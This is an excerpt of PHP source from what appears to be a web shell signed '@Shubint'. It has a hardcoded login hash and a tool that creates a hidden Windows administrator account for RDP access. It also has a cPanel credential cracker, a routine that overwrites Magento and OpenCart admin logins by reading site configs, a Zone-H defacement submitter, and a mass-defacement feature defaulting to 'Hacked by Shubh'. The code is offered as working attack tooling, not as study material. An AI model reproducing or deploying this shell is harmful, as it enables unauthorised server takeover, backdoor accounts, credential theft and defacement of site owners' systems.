...
$password = "4efb3500fb84755503e76f29b1d571a0"; # md5: Shubh@7781
...
<header>
 ...
 <br><br><br><br> <center><img src="https://i.ibb.co/Kykr8yK/31957b3a8ef775cfa27e7642589fd029.gif" height="default" width="default">
       <br>
 ___________________________
   made with love by @Shubint
 ---------------------------
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/Shubh/", exe("net user"))) die(color(1, 1, "[INFO] username 'Shubh' already exists."));

		$add_user   = exe("net userShubh /add");
    	$add_groups1 = exe("net localgroup Administrators Shubh /add");
    	$add_groups2 = exe("net localgroup Administrator Shubh /add");
    	$add_groups3 = exe("net localgroup Administrateur Shubh /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "Shubh")."<br>
    	Password: ".color(1, 2, "ShubhIcp@77")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Credit &copy; ".date("Y")." - <a href='t.me/shubint' target='_blank'>".color(1, 2, "@shubint")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: Your name <br>
		    	       <input type='text' name='nick' size='50' value='Shubh'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == '@Insta @shub.php') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Shubh")."</p>";
			} else {
				print "<center>
					   <span>NB: CPanel Crack auto pass <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
					   <form method='post'>
					   USER: <br>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
					print "username and password have to contain 6 letters";
				} 
				else {
					$user_id = $_POST['user_id'];
					$pass_id = md5($_POST['pass_id']);
					...
					foreach($scan_conf as $file_conf) {
						...
						elseif(preg_match("/Magento|Mage_Core/",$config)) {
							...
							if(!$update OR !$conn OR !$db) {
								...
								print "Status => ".color(1, 2, "successful edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='Shubh' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='Shubh' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='Change' value='Change!'>
				</form></center>";
			}
		}
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   <font style='text-decoration: underline;'>Do everything at Mass:</font><br>
					   ...
					   <span>( Please support me on insta @shub.php )</span><br><br>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Shubh</textarea><br>
